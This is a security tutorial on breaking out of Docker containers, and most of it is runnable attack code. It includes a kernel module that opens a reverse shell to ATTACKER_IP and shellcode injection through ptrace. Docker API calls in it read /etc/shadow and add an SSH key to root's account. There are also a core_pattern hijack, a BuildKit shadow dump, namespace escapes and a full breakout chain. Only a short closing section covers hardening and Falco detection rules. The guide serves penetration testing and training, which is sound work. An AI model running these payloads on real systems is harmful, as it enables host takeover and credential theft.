# Docker Breakout and Escape Guide

> Deep-dive into Docker container breakout techniques including privileged container abuse, cgroup escape mechanisms, namespace exploitation, and host kernel interaction attacks. This guide covers advanced escape methods beyond the foundational techniques in the container-escape-techniques guide.

## Introduction

Docker containers rely on Linux kernel isolation primitives -- namespaces, cgroups, capabilities, seccomp profiles, and mandatory access control (AppArmor/SELinux) -- to create a boundary between the container and the host. A container breakout occurs when an attacker bypasses one or more of these boundaries and gains access to the host system or other containers on the same host.

While the foundational container escape guide covers the most common techniques (cgroup release_agent, Docker socket, host filesystem mount), this guide focuses on advanced and lesser-known breakout methods that target Docker-specific configurations, kernel interaction flaws, and misconfigurations that are increasingly common in production environments.

Understanding these techniques is critical for red team operators performing container security assessments and for defenders building hardening strategies. Each technique includes the specific Docker configuration that enables it, the exploitation steps, detection methods, and mitigations.

### Breakout Taxonomy

| Category | Technique | Docker Config | Impact |
|----------|-----------|---------------|--------|
| Capability abuse | CAP_SYS_MODULE | --cap-add=SYS_MODULE | Kernel module loading, full host root |
| Capability abuse | CAP_SYS_PTRACE + hostPID | --pid=host --cap-add=SYS_PTRACE | Process injection into host |
| Capability abuse | CAP_DAC_READ_SEARCH | --cap-add=DAC_READ_SEARCH | Host filesystem traversal |
| Namespace | User namespace escalation | --userns=host | Full container escape |
| Namespace | Network namespace pivot | --net=host | Traffic interception, MITM |
| Seccomp | Seccomp profile bypass | --security-opt seccomp=unconfined | Unrestricted syscalls |
| AppArmor | Profile bypass or absence | --security-opt apparmor=unconfined | No MAC enforcement |
| Runtime | Docker API exploitation | Docker TCP socket exposed (2375/2376) | Remote container control |
| Shared resources | Host IPC namespace | --ipc=host | Shared memory attacks |
| Shared resources | Host UTS namespace | --uts=host | Hostname manipulation |
| Docker-specific | Volume mount escalation | -v /:/host or sensitive paths | Direct host access |
| Docker-specific | Docker daemon misconfiguration | privileged: true in docker-compose | All capabilities, all devices |

## Prerequisites

- Kali Linux with Docker installed (`docker.io` package)
- Understanding of Linux capabilities, namespaces, and cgroups
- Familiarity with Docker CLI and docker-compose
- A test environment with intentionally vulnerable Docker configurations
- Tools: `capsh`, `nsenter`, `unshare`, `gcc`, `nmap`, `curl`

## 1. Privileged Container Deep Exploitation

### Identifying Privileged Containers

```bash
# From inside a container, check if privileged
# Method 1: Check capability mask (all 1s = privileged)
cat /proc/self/status | grep CapEff
# 0000003fffffffff indicates all capabilities are present

# Method 2: Decode the capability hex value
capsh --decode=0000003fffffffff

# Method 3: Check if all devices are accessible
ls -la /dev/ | wc -l
# Privileged containers see all host devices

# Method 4: Check for seccomp restrictions
grep Seccomp /proc/self/status
# Seccomp: 0 means no seccomp filter (unconfined)

# Method 5: Attempt operations that require privileges
mount -t cgroup cgroup /tmp/cgroup_test 2>/dev/null && echo "PRIVILEGED" || echo "NOT PRIVILEGED"
```

### Exploiting CAP_SYS_MODULE for Kernel Module Loading

```bash
# CAP_SYS_MODULE allows loading kernel modules from inside the container
# This provides direct kernel-level code execution on the host

# Step 1: Check if CAP_SYS_MODULE is present
capsh --print | grep cap_sys_module

# Step 2: Install kernel headers (matching host kernel)
uname -r  # Note the kernel version
apt update && apt install -y linux-headers-$(uname -r) gcc make

# Step 3: Create a reverse shell kernel module
mkdir -p /tmp/kmod && cd /tmp/kmod

cat > reverse_shell.c << 'EOF'
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Assessment");
MODULE_DESCRIPTION("Container escape test module");

static int __init reverse_shell_init(void) {
    char *argv[] = {"/bin/bash", "-c",
        "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL};
    static char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Escape module unloaded\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
EOF

cat > Makefile << 'EOF'
obj-m += reverse_shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
EOF

# Step 4: Build and load the module
make
insmod reverse_shell.ko
# This executes the reverse shell on the HOST kernel context
```

### CAP_SYS_PTRACE with hostPID for Process Injection

```bash
# When --pid=host and CAP_SYS_PTRACE are both present
# The container can read and write memory of any host process

# Step 1: Identify target host processes
ps aux | grep -E "(sshd|nginx|apache|docker)" | head -20

# Step 2: Read memory maps of a host process
PID=1234  # Target process PID on host
cat /proc/$PID/maps | head -30

# Step 3: Dump process memory regions
cat /proc/$PID/maps | grep "r-xp" | while read line; do
    start=$(echo $line | cut -d'-' -f1)
    end=$(echo $line | cut -d' ' -f1 | cut -d'-' -f2)
    start_dec=$((16#$start))
    end_dec=$((16#$end))
    size=$((end_dec - start_dec))
    echo "Region: 0x$start - 0x$end ($size bytes): $line"
done

# Step 4: Use gdb for memory manipulation (if available)
gdb -p $PID -batch -ex "dump memory /tmp/dump.bin 0x400000 0x401000"

# Step 5: Inject shellcode via ptrace
python3 << 'PYEOF'
import ctypes, struct

# PTRACE_ATTACH, PTRACE_POKEDATA, PTRACE_DETACH
PTRACE_ATTACH = 16
PTRACE_POKEDATA = 5
PTRACE_DETACH = 17

libc = ctypes.CDLL("libc.so.6")
target_pid = 1234  # Replace with actual PID

# Attach to target process
libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)

# Wait for the process to stop
import os
os.waitpid(target_pid, 0)

print(f"Attached to PID {target_pid}")
print("Process memory is now accessible for read/write")
# Continue with shellcode injection...
PYEOF
```

## 2. Docker Daemon TCP Socket Exploitation

### Discovering Exposed Docker Sockets

```bash
# Docker daemon can be exposed on TCP ports 2375 (HTTP) or 2376 (HTTPS)
# Common in development environments and CI/CD pipelines

# Scan for exposed Docker daemons on a target network
nmap -p 2375,2376,4243 192.168.1.0/24 --open -T4

# Docker API version detection
curl -s http://TARGET:2375/version | jq .
curl -sk https://TARGET:2376/version | jq .

# Enumerate running containers
curl -s http://TARGET:2375/containers/json | jq '.[].Names'

# Enumerate images
curl -s http://TARGET:2375/images/json | jq '.[].RepoTags'
```

### Remote Container Creation for Host Access

```bash
# Create a privileged container that mounts the host root filesystem
curl -s -X POST "http://TARGET:2375/containers/create?name=escape" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "while true; do sleep 60; done"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/mnt/host"],
      "PidMode": "host",
      "NetworkMode": "host"
    }
  }' | jq .

# Start the escape container
curl -s -X POST "http://TARGET:2375/containers/escape/start"

# Execute commands inside the escape container
# Read host shadow file
curl -s -X POST "http://TARGET:2375/containers/escape/exec" \
  -H "Content-Type: application/json" \
  -d '{
    "AttachStdout": true,
    "Cmd": ["cat", "/mnt/host/etc/shadow"]
  }' | jq .

# Add SSH key to host root account
curl -s -X POST "http://TARGET:2375/containers/escape/exec" \
  -H "Content-Type: application/json" \
  -d '{
    "AttachStdout": true,
    "Cmd": ["/bin/sh", "-c", "mkdir -p /mnt/host/root/.ssh && echo ssh-rsa AAAA... >> /mnt/host/root/.ssh/authorized_keys"]
  }' | jq .

# Clean up: remove the escape container
curl -s -X POST "http://TARGET:2375/containers/escape/stop"
curl -s -X DELETE "http://TARGET:2375/containers/escape"
```

## 3. Shared Namespace Exploitation

### IPC Namespace (--ipc=host) Attacks

```bash
# When a container shares the host IPC namespace
# It can access shared memory segments used by host processes

# List host shared memory segments
ipcs -m

# Attach to a shared memory segment
# First identify segments with useful data
ipcs -m --human

# Read shared memory content
SHMID=12345  # Target shared memory ID
ipcs -m -i $SHMID

# Create a reader for the shared memory segment
cat > /tmp/shm_read.c << 'EOF'
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <shmid>\n", argv[0]);
        return 1;
    }
    int shmid = atoi(argv[1]);
    struct shmid_ds buf;
    shmctl(shmid, IPC_STAT, &buf);
    printf("Segment size: %zu bytes\n", buf.shm_segsz);

    char *addr = shmat(shmid, NULL, SHM_RDONLY);
    if (addr == (char *)-1) {
        perror("shmat");
        return 1;
    }

    // Dump segment content
    fwrite(addr, 1, buf.shm_segsz > 4096 ? 4096 : buf.shm_segsz, stdout);

    shmdt(addr);
    return 0;
}
EOF
gcc -o /tmp/shm_read /tmp/shm_read.c
/tmp/shm_read $SHMID | strings
```

### Network Namespace (--net=host) Exploitation

```bash
# When --net=host is used, the container shares the host network stack
# This enables traffic interception, port scanning, and MITM attacks

# Capture traffic on host interfaces
tcpdump -i any -w /tmp/capture.pcap -c 1000

# Scan host-internal services not normally accessible
nmap -sT -p- 127.0.0.1 --min-rate 5000

# Intercept localhost traffic
# Set up ARP spoofing for container-to-container traffic
arpspoof -i eth0 -t TARGET_IP ROUTER_IP

# Access host-bound services that listen on localhost only
curl -s http://127.0.0.1:10250/pods  # Kubernetes kubelet
curl -s http://127.0.0.1:2379/v2/keys  # etcd
curl -s http://127.0.0.1:9090/metrics  # Prometheus

# Detect Docker proxy and exploit
ss -tlnp | grep docker-proxy

# Use netfilter to redirect traffic
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

## 4. Volume Mount Escalation

### Sensitive Path Mount Detection

```bash
# Enumerate all mounts inside a container
mount | grep -E "^/dev"

# Check for dangerous mounts
cat /proc/mounts | while read dev path type opts rest; do
    case "$path" in
        /host*|/mnt/host*|/rootfs*) echo "[CRITICAL] Host root mount: $path" ;;
        /var/run/docker.sock) echo "[CRITICAL] Docker socket mount" ;;
        /proc*) echo "[HIGH] Proc filesystem: $path" ;;
        /sys*) echo "[HIGH] Sys filesystem: $path" ;;
        /dev*) echo "[MEDIUM] Device mount: $path" ;;
        /etc*) echo "[MEDIUM] Etc mount: $path (may contain credentials)" ;;
    esac
done

# Check for sensitive file exposure
for path in /host/etc/shadow /host/etc/passwd /host/root/.ssh /host/etc/kubernetes; do
    if [ -e "$path" ]; then
        echo "[FOUND] $path is accessible"
    fi
done
```

### Exploiting /proc and /sys Mounts

```bash
# If /proc from host is mounted or accessible via /proc/1/root
# Access host processes and filesystem

# Read host kernel parameters
cat /proc/sys/kernel/core_pattern

# Write to kernel parameters (requires write access)
echo "|/path/to/malicious_binary" > /proc/sys/kernel/core_pattern
# When any process crashes, the malicious binary executes on the host

# Exploit /sys mounts for device access
ls /sys/class/net/  # Network interfaces
ls /sys/block/      # Block devices

# Access /dev entries via /sys
cat /sys/block/sda/dev  # Get major:minor numbers
mknod /tmp/hostdisk b 8 0  # Create device node (if allowed)
mount /tmp/hostdisk /mnt/hostdisk
```

## 5. Docker API and Container Runtime Attacks

### Containerd (ctr) Abuse

```bash
# If containerd socket is accessible
ls -la /run/containerd/containerd.sock

# List containers via containerd
ctr --address /run/containerd/containerd.sock -n moby containers ls

# List images
ctr --address /run/containerd/containerd.sock -n moby images ls

# Execute in a container directly (bypasses Docker)
ctr --address /run/containerd/containerd.sock -n moby task exec --exec-id shell CONTAINER_ID /bin/sh
```

### Buildkit Abuse

```bash
# If BuildKit socket is accessible
ls -la /run/buildkit/buildkitd.sock

# BuildKit can be abused to run privileged operations during build
cat > Dockerfile.escape << 'EOF'
FROM alpine
# During build, we can access buildkit's privileged context
RUN --mount=type=bind,source=/,target=/host \
    cat /host/etc/shadow > /tmp/shadow_dump
EOF

# Build using the malicious Dockerfile
buildctl --addr unix:///run/buildkit/buildkitd.sock \
  build --frontend dockerfile.v0 --local context=. --local dockerfile=.
```

## 6. Seccomp and AppArmor Bypass Techniques

### Identifying Active Profiles

```bash
# Check seccomp status
grep Seccomp /proc/self/status
# 0 = disabled, 1 = strict, 2 = filter

# Check AppArmor profile
cat /proc/self/attr/current
# unconfined = no AppArmor enforcement

# List allowed syscalls with seccomp-tools (if available)
seccomp-tools dump /bin/ls

# Check specific syscall availability
python3 -c "import ctypes; libc = ctypes.CDLL('libc.so.6'); print(libc.syscall(39))"
```

### Exploiting Unconfined Seccomp

```bash
# When seccomp is unconfined (common with --privileged or --security-opt seccomp=unconfined)
# All syscalls are available including dangerous ones

# Use unshare to create new namespaces (requires CAP_SYS_ADMIN)
unshare --mount --pid --fork --mount-proc /bin/bash
# This creates new mount and PID namespaces

# Create a new user namespace (may be available even without privileges)
unshare --user --map-root-user /bin/bash
id  # Shows root inside the new user namespace

# Use nsenter to enter other namespace contexts
# If any host PID namespace reference is available
nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash
```

## Hands-on Exercise: Complete Breakout Chain

### Scenario: Compromised CI/CD Container

You have gained access to a CI/CD build container. Perform a complete assessment and breakout.

```bash
# Step 1: Reconnaissance
echo "=== Container Detection ==="
cat /proc/1/cgroup 2>/dev/null | head -5
cat /proc/self/status | grep -E "(Cap|Seccomp)"
mount | grep -E "(cgroup|docker|host)"

# Step 2: Capability enumeration
echo "=== Capabilities ==="
capsh --print 2>/dev/null || grep Cap /proc/self/status

# Step 3: Check for Docker socket
echo "=== Docker Socket ==="
ls -la /var/run/docker.sock 2>/dev/null
ls -la /run/docker.sock 2>/dev/null

# Step 4: Check network exposure
echo "=== Network ==="
ip addr show 2>/dev/null || ifconfig
ss -tlnp 2>/dev/null || netstat -tlnp

# Step 5: Check for shared namespaces
echo "=== Namespaces ==="
ls -la /proc/1/ns/ 2>/dev/null
ls -la /proc/self/ns/

# Step 6: Check for host mounts
echo "=== Mounts ==="
cat /proc/mounts | grep -v "overlay\|proc\|tmpfs\|cgroup\|mqueue\|devpts"

# Step 7: Attempt breakout based on findings
# If Docker socket found:
if [ -S /var/run/docker.sock ]; then
    echo "[!] Docker socket accessible - attempting container escape"
    curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq '.[].Names'
fi

# If privileged:
if grep -q "0000003fffffffff" /proc/self/status 2>/dev/null; then
    echo "[!] Privileged container detected - attempting cgroup escape"
    mkdir /tmp/cgrp 2>/dev/null && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Cgroup mount successful - escape possible"
    fi
fi

# Step 8: Document findings
echo "=== Assessment Complete ==="
echo "Review output for exploitable conditions"
```

## Defense Perspective

### Hardening Docker Configurations

```bash
# 1. Never run privileged containers
# BAD:  docker run --privileged -d nginx
# GOOD: docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE -d nginx

# 2. Use Docker's built-in security options
docker run \
  --security-opt=no-new-privileges \
  --security-opt seccomp=seccomp-profile.json \
  --security-opt apparmor=docker-default \
  --read-only \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --pids-limit=50 \
  --memory=512m \
  --cpus=1.0 \
  -d nginx

# 3. Use user namespace remapping
# Configure in /etc/docker/daemon.json:
cat > /etc/docker/daemon.json << 'EOF'
{
  "userns-remap": "default",
  "seccomp-profile": "/etc/docker/seccomp.json",
  "icc": false,
  "log-level": "info",
  "userland-proxy": false,
  "no-new-privileges": true
}
EOF

# 4. Never expose Docker daemon on TCP without TLS
# Remove any -H tcp://0.0.0.0:2375 from Docker startup options

# 5. Use read-only root filesystem where possible
docker run --read-only --tmpfs /tmp --tmpfs /run -d nginx

# 6. Audit Docker configurations regularly
docker ps -q | xargs docker inspect --format '{{.Name}}: Priv={{.HostConfig.Privileged}} PidMode={{.HostConfig.PidMode}} NetMode={{.HostConfig.NetworkMode}} Caps={{.HostConfig.CapAdd}}'
```

### Detection with Falco

```bash
# Falco rules for Docker breakout detection
cat > /etc/falco/rules.d/docker_breakout.yaml << 'EOF'
- rule: Privileged Container Started
  desc: Detect privileged container creation
  condition: container and evt.type = execve and container.privileged = true
  output: "Privileged container started (user=%user.name container=%container.name image=%container.image.repository)"
  priority: WARNING

- rule: Container Mounting Host Filesystem
  desc: Detect host filesystem mount inside container
  condition: container and evt.type = mount and evt.arg.type = "ext4"
  output: "Host filesystem mount attempt (user=%user.name container=%container.name)"
  priority: CRITICAL

- rule: Docker Socket Access from Container
  desc: Detect Docker socket access from within container
  condition: container and fd.name = /var/run/docker.sock
  output: "Docker socket access from container (user=%user.name container=%container.name command=%proc.cmdline)"
  priority: CRITICAL

- rule: Kernel Module Loading from Container
  desc: Detect kernel module loading from inside container
  condition: container and evt.type in (init_module, finit_module)
  output: "Kernel module load from container (user=%user.name container=%container.name)"
  priority: CRITICAL
EOF
```

## References

- **Docker Security Documentation**: https://docs.docker.com/engine/security/
- **CIS Docker Benchmark**: https://www.cisecurity.org/benchmark/docker
- **Container Breakout Techniques (Trail of Bits)**: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
- **CVE-2019-5736 (runc)**: https://www.cvedetails.com/cve/CVE-2019-5736/
- **Docker Daemon Attack Surface**: https://docs.docker.com/engine/security/#docker-daemon-attack-surface
- **Linux Capabilities Manual**: https://man7.org/linux/man-pages/man7/capabilities.7.html
- **Falco Cloud Native Security**: https://falco.org/docs/
- **AppArmor for Docker**: https://docs.docker.com/engine/security/apparmor/
- **Seccomp Security Profiles**: https://docs.docker.com/engine/security/seccomp/
